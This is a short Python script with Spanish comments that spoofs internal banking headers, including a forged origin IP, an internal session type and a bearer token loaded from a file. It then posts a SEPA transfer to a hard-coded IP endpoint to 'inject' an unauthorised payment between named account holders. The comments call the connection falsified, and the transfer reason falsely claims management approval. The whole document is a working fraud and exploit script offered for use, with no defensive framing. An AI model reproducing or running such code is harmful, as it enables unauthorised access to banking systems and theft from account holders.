import requests
from datetime import datetime
import uuid

# Cargar token desde archivo
try:
    with open("interno_token.txt", 'r') as f:
        jwt_token = f.read().strip()
except FileNotFoundError:
    jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxxxxxxx"

# Headers reales desde el banco interno
headers = {
    "Host": "80.78.30.242", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0 (Internal Browser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/json",
    "Accept-Language": "es-ES;q=0.9,en;q=0.5",
    "Authorization": f"Bearer {jwt_token}",
    "Content-Type": "application/json",
    "X-Origin-IP": "192.168.1.10",
    "X-Token-ID": jwt_token,
    "X-Session-Type": "BANCO-INTERNAL",
    "X-Signed": "1",
}

# === Datos completos del modelo para inyectar transferencia ===
payload = {
    # --- DATOS PRINCIPALES DE LA TRANSFERENCIA ---
    "payment_id": str(uuid.uuid4()),  # ID único de 36 caracteres
    "instructed_amount": 100.00,
    "currency": "EUR",
    "reason": "Transferencia interna autorizada por gerencia",
    "requested_execution_date": datetime.today().strftime("%Y-%m-%d"),  # fecha de hoy

    # --- CUENTAS REQUERIDAS (FK) ---
    "debtor_account": {
        "iban": "DE0050000100200044824",
        "currency": "EUR"
    },
    "creditor_account": {
        "iban": "DE00500700100200044874",
        "currency": "EUR"
    },
    "creditor_agent": {
        "financial_institution_id": "CAIXESBB"
    },
    "creditor": {
        "name": "Tom Winter",
        "address": {
            "country": "DE",
            "street": "Augsburger Strasse 14a",
            "city": "80337 München, "
        }
    },
    "debtor": {
        "name": "Baroness Anna Meyer",
        "address": {
            "country": "DE",
            "street": "Frankfurter Allee 11",
            "city": "10247 Berlin"
        }
    }
}

# === Conexión interna falsificada al sistema bancario ===
session = requests.Session()
session.headers.update(headers)

# === Inyectamos transferencia ===
transfer_url = "http://80.78.30.242:9181/api/send-transfer"
transfer_r = session.post(transfer_url, json=payload)
print("\n[+] ¡Transferencia SEPA inyectada!")
print("Status code:", transfer_r.status_code)
print("Respuesta del servidor:", transfer_r.text)